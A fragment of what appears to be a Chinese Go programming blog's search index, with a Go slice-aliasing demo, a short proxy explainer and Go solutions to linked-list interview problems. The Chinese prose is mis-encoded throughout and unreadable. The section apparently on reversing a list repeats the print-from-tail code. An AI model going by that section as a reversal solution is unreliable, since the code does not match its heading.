class="number">1</span>, <span class="number">10</span>)</span><br><span class="line"><span class="comment">// s := []int&#123;3, 3, 3&#125;</span></span><br><span class="line"><span class="built_in">new</span> := myApp(s)</span><br><span class="line">fmt.Printf(<span class="string">&quot;sçš„å†…å­˜åœ°å€æ˜¯%p\n&quot;</span>, s)</span><br><span class="line">fmt.Printf(<span class="string">&quot;newçš„å†…å­˜åœ°å€æ˜¯%p\n&quot;</span>, <span class="built_in">new</span>)</span><br><span class="line">fmt.Println(s)</span><br><span class="line">fmt.Println(<span class="built_in">new</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¾“å‡ºä¸ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sçš„å†…å­˜åœ°å€æ˜¯<span class="number">0xc00001c140</span></span><br><span class="line"><span class="built_in">new</span>çš„å†…å­˜åœ°å€æ˜¯<span class="number">0xc00001c140</span></span><br><span class="line">[<span class="number">1</span>]</span><br><span class="line">[<span class="number">1</span> <span class="number">100</span>]</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå‚æ•°æŒ‡é’ˆå˜é‡çš„å€¼å’ŒåŸæŒ‡é’ˆå˜é‡çš„å€¼æ˜¯ä¸€è‡´çš„ï¼Œ<strong>ä¹Ÿå°±æ˜¯ä»–ä»¬åªæ˜¯å…±ç”¨ä¸€ä¸ªåº•å±‚æ•°ç»„ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­£å‘ä»£ç†å’Œåå‘ä»£ç†</title>
      <link href="/2022/06/09/%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
      <url>/2022/06/09/%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€å¥è¯æè¿°"><a href="#ä¸€å¥è¯æè¿°" class="headerlink" title="ä¸€å¥è¯æè¿°"></a>ä¸€å¥è¯æè¿°</h2><p>ä»£ç†AKAå‡è£…ï¼Œæ­£å‘ä»£ç†ä¹Ÿå°±æ˜¯å‡è£…proxyæ˜¯å®¢æˆ·ç«¯ï¼Œåå‘ä»£ç†ä»£ç†çš„æ˜¯æœåŠ¡ç«¯å‡è£…è‡ªå·±æ˜¯æœåŠ¡å™¨è®©clientæ¥è®¿é—®ã€‚</p><h2 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h2><h3 id="æ­£å‘ä»£ç†"><a href="#æ­£å‘ä»£ç†" class="headerlink" title="æ­£å‘ä»£ç†"></a>æ­£å‘ä»£ç†</h3><ol><li>ç§‘å­¦ä¸Šç½‘</li><li>åŠ é€Ÿè®¿é—®</li><li>ç¼“å­˜æ•°æ® </li><li>æˆæƒè®¿é—®</li><li>éšè—è®¿é—®è€…</li></ol><h3 id="åå‘ä»£ç†"><a href="#åå‘ä»£ç†" class="headerlink" title="åå‘ä»£ç†"></a>åå‘ä»£ç†</h3><ol><li>ä¿æŠ¤æœåŠ¡å™¨ </li><li>è´Ÿè½½å‡è¡¡</li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç®—æœºç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goç®—æ³•é¢˜æ•´ç†ä¹‹å‰‘æŒ‡offer</title>
      <link href="/2022/06/08/go%E7%AE%97%E6%B3%95%E9%A2%98%E6%95%B4%E7%90%86%E4%B9%8B%E5%89%91%E6%8C%87offer/"/>
      <url>/2022/06/08/go%E7%AE%97%E6%B3%95%E9%A2%98%E6%95%B4%E7%90%86%E4%B9%8B%E5%89%91%E6%8C%87offer/</url>
      
        <content type="html"><![CDATA[<h2 id="é“¾è¡¨"><a href="#é“¾è¡¨" class="headerlink" title="é“¾è¡¨"></a>é“¾è¡¨</h2><h3 id="ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨"><a href="#ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨" class="headerlink" title="ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨"></a><strong>ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param head ListNodeç±» </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹ä¸€ç»´æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printListFromTailToHead</span><span class="params">( head *ListNode )</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">var</span> list []<span class="keyword">int</span></span><br><span class="line">    <span class="keyword">if</span> head==<span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    list = printListFromTailToHead(head.Next)</span><br><span class="line">    list = <span class="built_in">append</span>(list,head.Val)</span><br><span class="line">    <span class="keyword">return</span> list</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="åè½¬é“¾è¡¨"><a href="#åè½¬é“¾è¡¨" class="headerlink" title="åè½¬é“¾è¡¨"></a>åè½¬é“¾è¡¨</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param head ListNodeç±» </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹ä¸€ç»´æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printListFromTailToHead</span><span class="params">( head *ListNode )</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">var</span> list []<span class="keyword">int</span></span><br><span class="line">    <span class="keyword">if</span> head==<span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    list = printListFromTailToHead(head.Next)</span><br><span class="line">    list = <span class="built_in">append</span>(list,head.Val)</span><br><span class="line">    <span class="keyword">return</span> list</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨"><a href="#åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨" class="headerlink" title="åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨"></a>åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pHead1 ListNodeç±» </span></span><br><span class="line"><span class="comment"> * @param pHead2 ListNodeç±» </span></span><br><span class="line"><span class="comment"> * @return ListNodeç±»</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Merge</span><span class="params">( pHead1 *ListNode ,  pHead2 *ListNode )</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    pre := &amp;ListNode&#123;&#125;</span><br><span class="line">    tmp := pre</span><br><span class="line">    <span class="keyword">for</span> pHead1!=<span class="literal">nil</span> &amp;&amp; pHead2!=<span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> pHead1.Val &lt;= pHead2.Val&#123;</span><br><span class="line">            pre.Next = pHead1</span><br><span class="line">            pHead1 = pHead1.Next</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pre.Next = pHead2</span><br><span class="line">            pHead2 = pHead2.Next</span><br><span class="line">        &#125;</span><br><span class="line">        pre = pre.Next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> pHead1 != <span class="literal">nil</span>&#123;</span><br><span class="line">        pre.Next = pHead1</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> pHead2 != <span class="literal">nil</span>&#123;</span><br><span class="line">        pre.Next = pHead2</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp.Next</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸¤ä¸ªé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…¬å…±ç»“ç‚¹"><a href="#ä¸¤ä¸ªé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…¬å…±ç»“ç‚¹" class="headerlink" title="ä¸¤ä¸ªé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…¬å…±ç»“ç‚¹"></a><strong>ä¸¤ä¸ªé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…¬å…±ç»“ç‚¹</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pHead1 ListNodeç±» </span></span><br><span class="line"><span class="comment"> * @param pHead2 ListNodeç±» </span></span><br><span class="line"><span class="comment"> * @return ListNodeç±»</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FindFirstCommonNode</span><span class="params">( pHead1 *ListNode ,  pHead2 *ListNode )</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pHead1 == <span class="literal">nil</span> || pHead2==<span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    up := pHead1</span><br><span class="line">    down := pHead2</span><br><span class="line">    <span class="keyword">for</span> pHead1 != pHead2 &#123;</span><br><span class="line">        <span class="keyword">if</span> pHead1 == <span class="literal">nil</span>&#123;</span><br><span class="line">            pHead1 = down</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pHead1 = pHead1.Next </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> pHead2 == <span class="literal">nil</span>&#123;</span><br><span class="line">            pHead2 = up</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pHead2 = pHead2.Next</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pHead1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹"><a href="#é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹" class="headerlink" title="é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹"></a><strong>é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EntryNodeOfLoop</span><span class="params">(pHead *ListNode)</span> *<span class="title">ListNode</span></span>&#123;</span><br><span class="line">        slow,fast := pHead,pHead</span><br><span class="line">        <span class="keyword">for</span> slow!=<span class="literal">nil</span> &amp;&amp; fast!= <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> slow==<span class="literal">nil</span> || fast==<span class="literal">nil</span>|| fast.Next==<span class="literal">nil</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">            &#125;</span><br><span class="line">            slow = slow.Next</span><br><span class="line">            fast = fast.Next.Next</span><br><span class="line">            <span class="keyword">if</span> slow == fast&#123;</span><br><span class="line">                slow = pHead</span><br><span class="line">                <span class="keyword">for</span> slow != fast&#123;</span><br><span class="line">                    slow = slow.Next</span><br><span class="line">                    fast = fast.Next</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> slow</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é“¾è¡¨ä¸­å€’æ•°æœ€åkä¸ªç»“ç‚¹"><a href="#é“¾è¡¨ä¸­å€’æ•°æœ€åkä¸ªç»“ç‚¹" class="headerlink" title="é“¾è¡¨ä¸­å€’æ•°æœ€åkä¸ªç»“ç‚¹"></a><strong>é“¾è¡¨ä¸­å€’æ•°æœ€åkä¸ªç»“ç‚¹</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pHead ListNodeç±» </span></span><br><span class="line"><span class="comment"> * @param k intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @return ListNodeç±»</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FindKthToTail</span><span class="params">( pHead *ListNode ,  k <span class="keyword">int</span> )</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    fast, slow := pHead, pHead</span><br><span class="line">    <span class="keyword">for</span> fast != <span class="literal">nil</span> &amp;&amp; k &gt; <span class="number">0</span> &#123;</span><br><span class="line">        k--</span><br><span class="line">        fast = fast.Next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> k &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> fast != <span class="literal">nil</span> &#123;</span><br><span class="line">        fast = fast.Next</span><br><span class="line">        slow = slow.Next</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> slow</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚é“¾è¡¨çš„å¤åˆ¶"><a href="#å¤æ‚é“¾è¡¨çš„å¤åˆ¶" class="headerlink" title="å¤æ‚é“¾è¡¨çš„å¤åˆ¶"></a><strong>å¤æ‚é“¾è¡¨çš„å¤åˆ¶</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">type RandomListNode struct &#123;</span></span><br><span class="line"><span class="comment">    Label int</span></span><br><span class="line"><span class="comment">    Next *RandomListNode</span></span><br><span class="line"><span class="comment">    Random *RandomListNode</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param pHead RandomListNodeç±»</span></span><br><span class="line"><span class="comment"> * @return RandomListNodeç±»</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Clone</span><span class="params">( head *RandomListNode )</span> *<span class="title">RandomListNode</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> head == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    check :=<span class="built_in">make</span>(<span class="keyword">map</span>[*RandomListNode]*RandomListNode)</span><br><span class="line">    tem := head </span><br><span class="line">    <span class="keyword">for</span>  tem !=<span class="literal">nil</span> &#123;</span><br><span class="line">        dum := &amp;RandomListNode&#123;Label:tem.Label&#125;</span><br><span class="line">        check[tem]=dum</span><br><span class="line">        tem = tem.Next</span><br><span class="line">    &#125;</span><br><span class="line">    cur := head</span><br><span class="line">    <span class="keyword">for</span> cur != <span class="literal">nil</span> &#123;</span><br><span class="line">        check[cur].Random = check[cur.Random]</span><br><span class="line">        check[cur].Next = check[cur.Next]</span><br><span class="line">        cur = cur.Next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> check[head]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„ç»“ç‚¹"><a href="#åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„ç»“ç‚¹" class="headerlink" title="åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„ç»“ç‚¹"></a><strong>åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„ç»“ç‚¹</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pHead ListNodeç±» </span></span><br><span class="line"><span class="comment"> * @return ListNodeç±»</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deleteDuplication</span><span class="params">( pHead *ListNode )</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pHead ==<span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    pre := &amp;ListNode&#123;&#125;</span><br><span class="line">    pre.Next = pHead</span><br><span class="line">    cur := pre</span><br><span class="line">    <span class="keyword">for</span> cur != <span class="literal">nil</span> &amp;&amp; cur.Next != <span class="literal">nil</span> &amp;&amp; cur.Next.Next != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> cur.Next.Val == cur.Next.Next.Val&#123;</span><br><span class="line">            tmp := cur.Next.Val</span><br><span class="line">            <span class="keyword">for</span> cur.Next != <span class="literal">nil</span> &amp;&amp; cur.Next.Val == tmp&#123;</span><br><span class="line">                cur.Next = cur.Next.Next</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            cur = cur.Next</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pre.Next</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤é“¾è¡¨çš„èŠ‚ç‚¹"><a href="#åˆ é™¤é“¾è¡¨çš„èŠ‚ç‚¹" class="headerlink" title="åˆ é™¤é“¾è¡¨çš„èŠ‚ç‚¹"></a><strong>åˆ é™¤é“¾è¡¨çš„èŠ‚ç‚¹</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 